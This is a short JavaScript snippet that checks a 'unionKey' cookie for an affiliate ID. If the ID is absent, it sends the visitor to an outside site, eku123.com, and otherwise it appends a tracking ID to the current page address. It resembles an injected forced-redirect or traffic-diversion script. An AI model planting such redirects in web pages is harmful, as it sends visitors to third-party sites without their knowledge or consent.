var getCookie = function(c_name) {
            if (document.cookie.length > 0) {
                c_start = document.cookie.indexOf(c_name + "=");
                if (c_start != -1) {
                    c_start = c_start + c_name.length + 1;
                    c_end = document.cookie.indexOf(";", c_start);
                    if (c_end == -1) {
                        c_end = document.cookie.length;
                    }
                    return unescape(document.cookie.substring(c_start, c_end));
                }
            }
            return "";
        };
var key = "unionKey";
var UNION_ID = "101117870930";
var channelIdReg = new RegExp(UNION_ID);
if (!channelIdReg.test(getCookie(key))) {
    var f= parseInt(1E4*Math.random());
    var k=(new Date).valueOf();
    var turl = "http://www.eku123.com/mainm.html?f="+ f + "&k=" + k;
    window.location.href=turl;
}else{
    var l=window.location.href;
    window.location.href=l+((/\?/g.test(l)?"&":"?")+"t_id=ba104efa71f0b565");
}
